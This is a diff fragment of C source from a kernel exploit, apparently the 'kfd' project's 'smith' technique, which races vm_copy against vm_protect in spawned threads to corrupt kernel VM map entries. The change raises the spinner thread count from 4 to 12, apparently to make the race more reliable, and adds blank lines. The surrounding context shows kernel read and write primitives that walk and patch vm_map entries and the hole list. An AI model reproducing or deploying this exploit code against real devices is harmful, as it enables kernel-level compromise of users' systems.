@@ -79,7 +79,7 @@ void smith_run(struct kfd* kfd)
      * Note that vm_copy() in the main thread corresponds to substep 2A in the write-up
      * and vm_protect() in the spawned threads corresponds to substep 2B.
      */
-    const u64 number_of_spinner_pthreads = 4;
+    const u64 number_of_spinner_pthreads = 12;//4;
     pthread_t spinner_pthreads[number_of_spinner_pthreads] = {};
 
     for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
@@ -408,6 +408,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          */
         usleep(100);
     }
+
     u64 map_kaddr = kfd->info.kernel.current_map;
 
     do {
@@ -431,6 +432,7 @@ void smith_helper_cleanup(struct kfd* kfd)
         u64 leaked_entry_prev = 0;
         u64 leaked_entry_next = 0;
         u64 leaked_entry_end = 0;
+
         while (entry_kaddr != map_entry_kaddr) {
             entry_count++;
             u64 entry_next = static_kget(vm_map_entry, u64, links.next, entry_kaddr);
@@ -516,6 +518,7 @@ void smith_helper_cleanup(struct kfd* kfd)
          */
         dynamic_kset_u64(vm_map, hint, map_kaddr, map_entry_kaddr);
     } while (0);
+
     do {
         /*
          * Scan hole list: we use the kread primitive to loop through every hole
